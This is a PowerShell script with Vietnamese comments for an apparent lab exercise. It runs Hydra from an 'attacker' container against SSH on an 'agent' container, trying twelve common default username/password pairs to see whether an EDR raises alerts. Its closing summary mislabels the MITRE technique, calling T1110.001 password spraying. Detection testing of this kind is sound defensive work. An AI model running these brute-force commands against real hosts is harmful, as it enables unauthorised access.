# Script mo phong tan cong SSH de kiem tra he thong bao mat
# Duoc viet boi team security de test kha nang phat hien cua EDR

Write-Host "=============================================" -ForegroundColor Red
Write-Host "    KIEM TRA BAO MAT HE THONG SSH" -ForegroundColor Red  
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""
Write-Host "Thong tin muc tieu can kiem tra:" -ForegroundColor Yellow
Write-Host "  >> May chu dich: container agent" -ForegroundColor White
Write-Host "  >> Dia chi IP: 172.19.0.2" -ForegroundColor White  
Write-Host "  >> Cong dich vu: 22 (SSH)" -ForegroundColor White
Write-Host "  >> Cong cu test: Hydra scanner" -ForegroundColor White
Write-Host "  >> Nguon test: container attacker" -ForegroundColor White
Write-Host ""

# Giai doan 1: Thu cac tai khoan quan tri thong thuong
Write-Host "[GIAI DOAN 1] Kiem tra cac tai khoan admin pho bien" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan

Write-Host "`n[Test 1.1] Dang thu dang nhap admin/admin123..." -ForegroundColor Green
docker exec attacker hydra -l admin -p admin123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 1.2] Kiem tra administrator/password..." -ForegroundColor Green  
docker exec attacker hydra -l administrator -p password ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 1.3] Thu ket noi root/toor..." -ForegroundColor Green
docker exec attacker hydra -l root -p toor ssh://agent -t 2 -v
Start-Sleep 2

# Giai doan 2: Test cac combo tai khoan mat khau hay gap
Write-Host "`n[GIAI DOAN 2] Kiem tra username/password thuong thay" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

Write-Host "`n[Test 2.1] Thu nghiem user/user123..." -ForegroundColor Green
docker exec attacker hydra -l user -p user123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 2.2] Kiem tra guest/guest..." -ForegroundColor Green
docker exec attacker hydra -l guest -p guest ssh://agent -t 2 -v  
Start-Sleep 2

Write-Host "`n[Test 2.3] Test account test/test123..." -ForegroundColor Green
docker exec attacker hydra -l test -p test123 ssh://agent -t 2 -v
Start-Sleep 2

# Giai doan 3: Mo phong tan cong cuong do cao nhieu luong
Write-Host "`n[GIAI DOAN 3] Test kha nang chiu tai voi nhieu ket noi dong thoi" -ForegroundColor Cyan
Write-Host "=============================================================" -ForegroundColor Cyan

Write-Host "`n[Test 3.1] Kiem tra voi 4 luong ket noi cung luc..." -ForegroundColor Green
docker exec attacker hydra -l hacker -p password123 ssh://agent -t 4 -v
Start-Sleep 3

Write-Host "`n[Test 3.2] Test tai nang voi 6 luong..." -ForegroundColor Green
docker exec attacker hydra -l malicious -p hack123 ssh://agent -t 6 -v
Start-Sleep 3

# Giai doan 4: Kiem tra cac tai khoan dich vu he thong  
Write-Host "`n[GIAI DOAN 4] Test security cho cac service accounts" -ForegroundColor Cyan
Write-Host "=================================================" -ForegroundColor Cyan

Write-Host "`n[Test 4.1] Thu tai khoan SSH service..." -ForegroundColor Green
docker exec attacker hydra -l sshd -p sshd123 ssh://agent -t 3 -v
Start-Sleep 2

Write-Host "`n[Test 4.2] Kiem tra system accounts..." -ForegroundColor Green
docker exec attacker hydra -l daemon -p daemon ssh://agent -t 2 -v
Start-Sleep 2

# Giai doan 5: Mo phong tan cong tu dien dictionary attack
Write-Host "`n[GIAI DOAN 5] Kiem tra voi pattern tu dien mat khau" -ForegroundColor Cyan  
Write-Host "===============================================" -ForegroundColor Cyan

Write-Host "`n[Test 5.1] Thu cac password tu wordlist..." -ForegroundColor Green
docker exec attacker hydra -l ubuntu -p ubuntu ssh://agent -t 3 -v
Start-Sleep 2

Write-Host "`n[Test 5.2] Test mat khau yeu thuong gap..." -ForegroundColor Green
docker exec attacker hydra -l backup -p backup123 ssh://agent -t 2 -v
Start-Sleep 2

Write-Host "`n[Test 5.3] Kiem tra default credentials..." -ForegroundColor Green  
docker exec attacker hydra -l service -p service ssh://agent -t 2 -v

Write-Host "`n=============================================" -ForegroundColor Red
Write-Host "    HOAN THANH KIEM TRA BAO MAT SSH" -ForegroundColor Red
Write-Host "=============================================" -ForegroundColor Red
Write-Host ""
Write-Host "Tong ket ket qua:" -ForegroundColor Yellow
Write-Host "  >> Tong so test case: 12 combo username/password khac nhau" -ForegroundColor White
Write-Host "  >> Loai test: Admin accounts, mat khau thuong gap, da luong" -ForegroundColor White  
Write-Host "  >> Monitoring: Kiem tra EDR dashboard de xem alerts va events" -ForegroundColor White
Write-Host "  >> MITRE Framework: T1110.001 Password Spraying technique" -ForegroundColor White
Write-Host ""
Write-Host "Luu y: Day la test bao mat hop phap trong moi truong lab" -ForegroundColor Gray
